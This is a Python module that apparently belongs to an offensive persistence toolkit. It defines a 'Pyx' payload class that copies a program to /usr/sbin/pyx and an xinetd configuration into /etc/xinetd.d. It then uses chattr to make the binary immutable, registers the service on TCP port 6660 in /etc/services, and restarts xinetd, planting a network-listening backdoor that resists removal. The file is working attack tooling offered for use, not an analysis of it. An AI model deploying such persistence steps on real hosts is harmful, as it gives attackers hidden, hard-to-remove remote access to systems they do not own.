#!/usr/bin/python3

from ..base import Payload

class Pyx(Payload):

    files = {'pyx.py': '/usr/sbin/pyx',
             'pyx.xinetd': '/etc/xinetd.d/pyx'
             }

    def __init__(self):
        self.commands = []

        self.commands.append("chattr -i /usr/sbin/pyx")
        self.commands.append("chmod +x /usr/sbin/pyx")
        self.commands.append("chattr +i /usr/sbin/pyx")
        self.commands.append("printf '\\npyx\\t\\t6660/tcp\\n' >> /etc/services")
        self.commands.append("service xinetd restart")

    def steps(self):
        return self.commands


